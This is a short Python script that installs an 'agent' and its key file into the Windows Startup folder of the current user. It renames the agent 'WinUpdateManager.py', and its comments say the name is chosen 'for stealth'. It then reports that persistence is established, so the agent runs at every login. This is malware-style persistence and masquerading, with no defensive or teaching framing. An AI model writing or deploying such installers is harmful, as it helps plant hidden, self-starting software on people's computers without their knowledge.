import os
import shutil
import getpass

# 1. Identify the user and the paths you found yesterday
username = getpass.getuser()
startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

# 2. Define the new "Boring" names for stealth
agent_destination = os.path.join(startup_path, "WinUpdateManager.py")
key_destination = os.path.join(startup_path, "key.vault")

def install():
    try:
        # Copy the Agent
        shutil.copy("agent.py", agent_destination)
        # Copy the Key (The Agent needs it to start!)
        shutil.copy("key.vault", key_destination)
        
        print(f"[+] Persistence established at: {startup_path}")
        print("[+] The Agent will now start automatically every time you log in.")
    except Exception as e:
        print(f"[-] Installation failed: {e}")

if __name__ == "__main__":
    install()